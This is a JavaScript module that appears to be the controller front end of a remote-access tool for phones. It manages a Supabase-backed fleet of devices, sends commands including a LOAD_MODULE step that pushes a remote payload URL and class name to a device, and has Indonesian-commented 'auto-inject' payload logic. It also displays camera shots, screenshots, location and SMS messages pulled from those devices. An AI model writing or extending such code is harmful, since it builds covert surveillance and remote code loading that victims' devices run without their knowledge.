const DeviceService = {
    fleetChannel: null,
    deviceChannel: null,

    async init() {
        await this.refresh();
        this.bindFleet();
        if (state.data.selectedDeviceId) {
            await this.select(state.data.selectedDeviceId, true);
        }
    },

    shutdown() {
        if (this.fleetChannel) {
            supabaseClient.removeChannel(this.fleetChannel);
            this.fleetChannel = null;
        }
        if (this.deviceChannel) {
            supabaseClient.removeChannel(this.deviceChannel);
            this.deviceChannel = null;
        }
    },

    bindFleet() {
        if (this.fleetChannel) supabaseClient.removeChannel(this.fleetChannel);
        this.fleetChannel = supabaseClient
            .channel("devices_changes_minimal")
            .on("postgres_changes", { event: "*", schema: "public", table: "devices" }, async () => {
                await this.refresh();
            })
            .subscribe();
    },

    bindDevice(deviceId) {
        if (this.deviceChannel) supabaseClient.removeChannel(this.deviceChannel);
        this.deviceChannel = supabaseClient
            .channel(`device:${deviceId}:minimal`)
            .on("postgres_changes", {
                event: "INSERT",
                schema: "public",
                table: "device_data",
                filter: `device_id=eq.${deviceId}`
            }, (payload) => {
                this.handleDeviceData(payload.new);
            })
            .on("postgres_changes", {
                event: "UPDATE",
                schema: "public",
                table: "devices",
                filter: `id=eq.${deviceId}`
            }, async (payload) => {
                setState({ data: { selectedDevice: payload.new } });
                await this.refresh();
            })
            .subscribe();
    },

    clearSelection() {
        if (this.deviceChannel) {
            supabaseClient.removeChannel(this.deviceChannel);
            this.deviceChannel = null;
        }

        addLogEntry("Returned to device selection", "muted");

        setState({
            data: {
                selectedDeviceId: null,
                selectedDevice: null
            },
            ui: {
                view: "devices"
            }
        });
    },

    setToggleState(toggleKey, nextValue) {
        const deviceId = state.data.selectedDeviceId;
        const toggle = getToggleConfig(toggleKey);
        if (!deviceId || !toggle) return;

        const currentDeviceStates = state.data.controlStatesByDevice[deviceId] || {};
        setState({
            data: {
                controlStatesByDevice: {
                    ...state.data.controlStatesByDevice,
                    [deviceId]: {
                        ...currentDeviceStates,
                        [toggle.stateKey]: nextValue
                    }
                }
            }
        });
    },

    canAccess(device) {
        if (!device) return false;
        if (state.auth.isAdmin) return true;
        return true; // Schema does not support authorized_emails yet
    },

    async refresh() {
        const result = await safeQuery("devices", () => supabaseClient.from("devices").select("*"));
        if (!result?.data) return;

        const devices = [...result.data].sort((a, b) => {
            return (a.name || "").localeCompare(b.name || "") || a.id.localeCompare(b.id);
        });

        const selectedDevice = devices.find((device) => device.id === state.data.selectedDeviceId) || null;
        if (state.data.selectedDeviceId && !selectedDevice) {
            await StreamManager.stop("device-missing", false);
            setState({
                data: {
                    devices,
                    selectedDeviceId: null,
                    selectedDevice: null
                },
                ui: {
                    view: "devices"
                }
            });
            return;
        }

        setState({ data: { devices, selectedDevice } });
    },

    async select(deviceId, force = false) {
        if (!deviceId) return;

        // Cek apakah device benar-benar ada di list
        const device = state.data.devices.find((item) => item.id === deviceId) || null;
        if (!device) {
            console.warn("Device not found in local fleet, refreshing...");
            await this.refresh();
        }

        if (!this.canAccess(device)) {
            addToast("Access denied", "error");
            return;
        }

        if (deviceId === state.data.selectedDeviceId && !force) {
            await showView("remote");
            return;
        }

        await StreamManager.stop("device-switch", false);
        showLoader(true);

        // Ambil data device terbaru dari server (bypass cache lokal)
        const { data: deviceData, error: deviceError } = await supabaseClient.from("devices").select("*").eq("id", deviceId).maybeSingle();

        // Ambil Config dari Database
        const { data: settings } = await supabaseClient.from("app_settings").select("value").eq("key", "payload_urls").maybeSingle();

        showLoader(false);

        console.log("Device settings raw:", settings);

        if (deviceData) {
            const status = (typeof deviceData.status === "string") ? JSON.parse(deviceData.status || "{}") : (deviceData.status || {});

            // Re-sync local state
            setState({
                data: {
                    selectedDeviceId: deviceId,
                    selectedDevice: deviceData
                }
            });

            this.bindDevice(deviceId);

            // LOGIKA AUTO-INJECT PINTAR:
            // Jika payload_active true DAN device online, atau jika device baru saja inject (local session)
            const wasJustInjected = state.data.controlStatesByDevice[deviceId]?.payload_active;

            if ((status.payload_active || wasJustInjected) && isOnline(deviceData)) {
                addLogEntry(`Device active: ${deviceData.name || deviceId}`);
            } else {
                addLogEntry("Device selected. Payload status will sync shortly.");
            }

            await showView("remote");
        } else {
            addToast("Device not found on server", "error");
            this.clearSelection();
        }
    },

    async refreshSelected() {
        if (!state.data.selectedDeviceId) return;
        showLoader(true);
        const { data, error } = await supabaseClient.from("devices").select("*").eq("id", state.data.selectedDeviceId).maybeSingle();
        if (data) {
            setState({ data: { selectedDevice: data } });
            await this.refresh();
        }
        showLoader(false);
    },

    async send(command, { silent = false, showSuccess = false } = {}) {
        const deviceId = state.data.selectedDeviceId;
        const device = state.data.selectedDevice;

        if (!deviceId || !device) {
            addToast("No device selected", "error");
            return false;
        }

        if (!isOnline(device)) {
            if (!silent) addToast("Device is offline", "error");
            return false;
        }

        if (this._lastCommandTime && Date.now() - this._lastCommandTime < 400) {
            return false;
        }
        this._lastCommandTime = Date.now();

        const cleanCommand = command.trim();
        const result = await safeQuery("command", () =>
            supabaseClient.from("commands").insert([{
                device_id: deviceId,
                cmd: cleanCommand,
                created_at: new Date().toISOString()
            }]), { silent: true }
        );

        if (!result) {
            if (!silent) addToast("Command failed to sync", "error");
            return false;
        }

        if (showSuccess) {
            const rawCmd = cleanCommand.split(':')[0].split('_')[0];
            const readableCmd = rawCmd.charAt(0).toUpperCase() + rawCmd.slice(1);
            addToast(`Sent: ${readableCmd}`);
        }

        if (!silent) {
            let logCmd = cleanCommand;
            if (cleanCommand.startsWith(CMD.LOAD_MODULE)) {
                logCmd = `${CMD.LOAD_MODULE}:[PAYLOAD_URL]:[CLASS_NAME]`;
            }
            addLogEntry(`> Sending: ${logCmd}`, "muted");
        }
        return true;
    },

    handleDeviceData(row) {
        const type = row?.data_type;
        const content = row?.content;

        if (type === "image" || type === "camera" || type === "screenshot") {
            addLogEntry("Media received from device");
            // Check if content is a raw base64 and ensure it has the correct prefix
            let src = content;
            if (content && !content.startsWith("data:") && !content.startsWith("http")) {
                src = `data:image/jpeg;base64,${content}`;
            }
            UI.openImage(src);
            return;
        }

        if (type === "location") {
            try {
                addLogEntry("Location received from device");
                const loc = typeof content === 'string' ? JSON.parse(content) : content;
                UI.openLocation(loc);
            } catch (e) {
                console.error("Loc parse error", e);
                addToast("Bad location data", "error");
            }
            return;
        }

        if (type === "sms") {
            try {
                addLogEntry("Text messages received from device");
                const sms = typeof content === 'string' ? JSON.parse(content) : content;
                UI.openSms(sms);
            } catch (e) {
                console.error("SMS parse error", e);
                addToast("Bad SMS data", "error");
            }
        }
    }
};
